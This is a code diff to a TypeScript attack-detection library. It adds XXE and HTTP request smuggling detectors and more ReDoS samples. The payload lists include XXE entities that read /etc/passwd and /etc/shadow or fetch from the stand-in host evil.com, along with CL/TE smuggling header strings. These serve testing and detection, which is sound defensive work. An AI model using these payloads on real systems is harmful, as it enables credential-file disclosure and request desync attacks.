@@ -1,9 +1,128 @@
 /**
  * Open redirect, mass assignment, LDAP, ReDoS
  */
-import type { InvariantClassModule } from '../types.js'
+import type { InvariantClassModule, DetectionLevelResult } from '../types.js'
 import { deepDecode } from '../encoding.js'
 import { l2OpenRedirect, l2LDAPInjection } from '../../evaluators/l2-adapters.js'
+import { detectXXE } from '../../evaluators/xxe-evaluator.js'
+import { detectHTTPSmuggling } from '../../evaluators/http-smuggle-evaluator.js'
+
+function normalizeHttpInput(input: string): string {
+    return deepDecode(input)
+        .replace(/\\r\\n/g, '\r\n')
+        .replace(/\\n/g, '\n')
+}
+
+function tokenizeHttpHeaders(input: string): Array<{ name: string; value: string; line: number }> {
+    const headers: Array<{ name: string; value: string; line: number }> = []
+    const normalized = normalizeHttpInput(input)
+    const lines = normalized.split(/\r?\n/)
+    for (let i = 0; i < lines.length; i++) {
+        const line = lines[i]
+        if (line.trim() === '') break
+        const colon = line.indexOf(':')
+        if (colon <= 0) continue
+        const name = line.slice(0, colon).trim().toLowerCase()
+        const value = line.slice(colon + 1).trim()
+        if (/^[a-z0-9-]+$/.test(name)) {
+            headers.push({ name, value, line: i })
+        }
+    }
+    return headers
+}
+
+function l2LegacyXXE(input: string): DetectionLevelResult | null {
+    const decoded = deepDecode(input)
+    const detections = detectXXE(decoded)
+    if (detections.length === 0) return null
+
+    const best = detections.reduce((a, b) => (a.confidence > b.confidence ? a : b))
+    const marker = best.entityName && best.entityName !== 'unknown'
+        ? best.entityName
+        : '<!ENTITY'
+
+    return {
+        detected: true,
+        confidence: best.confidence,
+        explanation: `XXE structure analysis: ${best.detail}`,
+        evidence: best.detail,
+        structuredEvidence: [{
+            operation: 'semantic_eval',
+            matchedInput: marker,
+            interpretation: best.detail,
+            offset: Math.max(0, decoded.toLowerCase().indexOf(marker.toLowerCase())),
+            property: 'XML entities must not resolve attacker-controlled external resources',
+        }],
+    }
+}
+
+function l2LegacyHttpSmuggling(input: string): DetectionLevelResult | null {
+    const decoded = normalizeHttpInput(input)
+    const headers = tokenizeHttpHeaders(decoded)
+
+    const hasCL = headers.some(h => h.name === 'content-length')
+    const hasTE = headers.some(h => h.name === 'transfer-encoding')
+    const teHeaders = headers.filter(h => h.name === 'transfer-encoding')
+    const hasExpect = headers.some(h => h.name === 'expect' && /100-continue/i.test(h.value))
+
+    const clZero = headers.find(h => h.name === 'content-length' && h.value === '0')
+    const bodyBoundary = decoded.includes('\r\n\r\n')
+        ? decoded.indexOf('\r\n\r\n') + 4
+        : decoded.indexOf('\n\n') >= 0
+            ? decoded.indexOf('\n\n') + 2
+            : -1
+    const body = bodyBoundary >= 0 ? decoded.slice(bodyBoundary) : ''
+    const embeddedRequestCount = (decoded.match(/(?:GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+\/[^\s]*\s+HTTP\/[\d.]+/gi) ?? []).length
+
+    const l2Candidates: DetectionLevelResult[] = []
+    for (const d of detectHTTPSmuggling(decoded)) {
+        l2Candidates.push({
+            detected: true,
+            confidence: d.confidence,
+            explanation: `HTTP parser analysis: ${d.detail}`,
+            evidence: d.detail,
+        })
+    }
+
+    if (hasCL && hasTE) {
+        l2Candidates.push({
+            detected: true,
+            confidence: 0.95,
+            explanation: 'HTTP header tokenization found both Content-Length and Transfer-Encoding in one request (desync ambiguity)',
+            evidence: 'Content-Length + Transfer-Encoding',
+        })
+    }
+
+    if (teHeaders.length > 1) {
+        l2Candidates.push({
+            detected: true,
+            confidence: 0.93,
+            explanation: `HTTP header tokenization found ${teHeaders.length} Transfer-Encoding headers (TE/TE desync)`,
+            evidence: teHeaders.map(h => h.value).join(' | '),
+        })
+    }
+
+    if (clZero && body.trim().length > 0) {
+        l2Candidates.push({
+            detected: true,
+            confidence: 0.94,
+            explanation: `HTTP framing mismatch: Content-Length: 0 with non-empty body (${body.length} bytes)`,
+            evidence: `CL:0 + body:${body.slice(0, 80)}`,
+        })
+    }
+
+    if (hasExpect && (hasCL || hasTE || embeddedRequestCount >= 2)) {
+        l2Candidates.push({
+            detected: true,
+            confidence: 0.90,
+            explanation: `Expect: 100-continue combined with framing ambiguity (${embeddedRequestCount} HTTP request lines)`,
+            evidence: 'Expect: 100-continue + framing mismatch',
+        })
+    }
+
+    if (l2Candidates.length === 0) return null
+    return l2Candidates.reduce((a, b) => (a.confidence > b.confidence ? a : b))
+}
 
 export const openRedirectBypass: InvariantClassModule = {
     id: 'open_redirect_bypass',
@@ -128,6 +247,7 @@ export const regexDos: InvariantClassModule = {
     knownPayloads: [
         'a'.repeat(100) + '!',
         'x'.repeat(200),
+        'a'.repeat(120) + 'x'.repeat(120),
     ],
 
     knownBenign: [
@@ -155,5 +275,57 @@ export const regexDos: InvariantClassModule = {
         const v = ['a'.repeat(100) + '!', 'x'.repeat(200),
         'b'.repeat(60) + 'y'.repeat(60)]
         return v.slice(0, count)
+    },
+}
+
+export const xxeInjection: InvariantClassModule = {
+    id: 'xxe_injection',
+    description: 'XXE Injection',
+    category: 'injection',
+    severity: 'critical',
+    calibration: { baseConfidence: 0.90 },
+    formalProperty: `∃ decl ∈ parse(input, XML_DTD_GRAMMAR) :
+        decl.kind = ENTITY ∧ decl.source ∈ {SYSTEM, PUBLIC}
+        → parser_resolves_external_resource(decl.source)`,
+    mitre: ['T1190'],
+    cwe: 'CWE-611',
+    knownPayloads: ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', '<?xml version="1.0"?><!ENTITY % xxe SYSTEM "http://evil.com/xxe">', '<!ENTITY xxe SYSTEM "file:///etc/shadow">'],
+    knownBenign: ['xml version="1.0" encoding="UTF-8"?>', '<!DOCTYPE html PUBLIC', 'valid xml document'],
+    detect: (input: string): boolean => {
+        const d = deepDecode(input)
+        return /<\!(?:DOCTYPE|ENTITY)\s+[^>]*(?:SYSTEM|PUBLIC)\s+['"][^'"]+['"]/i.test(d)
+    },
+    detectL2: l2LegacyXXE,
+    generateVariants: (count: number): string[] => {
+        const v = ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', '<?xml version="1.0"?><!ENTITY % xxe SYSTEM "http://evil.com/xxe">', '<!ENTITY xxe SYSTEM "file:///etc/shadow">']
+        const r: string[] = []
+        for (let i = 0; i < count; i++) r.push(v[i % v.length])
+        return r
+    },
+}
+
+export const httpSmuggling: InvariantClassModule = {
+    id: 'http_smuggling',
+    description: 'HTTP Request Smuggling',
+    category: 'injection',
+    severity: 'critical',
+    calibration: { baseConfidence: 0.90 },
+    formalProperty: `∃ parseA, parseB ∈ parse(request, HTTP_GRAMMAR) :
+        boundaries(parseA) ≠ boundaries(parseB)
+        → frontend_backend_desync`,
+    mitre: ['T1190'],
+    cwe: 'CWE-444',
+    knownPayloads: ['Transfer-Encoding: chunked\\r\\nContent-Length: 0', 'GET / HTTP/1.1\\r\\nHost: internal\\r\\nTransfer-Encoding: chunked', 'POST / HTTP/1.1\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked'],
+    knownBenign: ['Content-Type: application/json', 'Content-Length: 42', 'HTTP/1.1 200 OK'],
+    detect: (input: string): boolean => {
+        const d = deepDecode(input)
+        return /transfer-encoding\s*:.*?(?:chunked|identity)[\s\S]*?content-length\s*:|content-length\s*:\s*\d+[\s\S]*?transfer-encoding\s*:|transfer-encoding\s*:\s*chunked/i.test(d)
+    },
+    detectL2: l2LegacyHttpSmuggling,
+    generateVariants: (count: number): string[] => {
+        const v = ['Transfer-Encoding: chunked\\r\\nContent-Length: 0', 'GET / HTTP/1.1\\r\\nHost: internal\\r\\nTransfer-Encoding: chunked', 'POST / HTTP/1.1\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked']
+        const r: string[] = []
+        for (let i = 0; i < count; i++) r.push(v[i % v.length])
+        return r
     },
 }
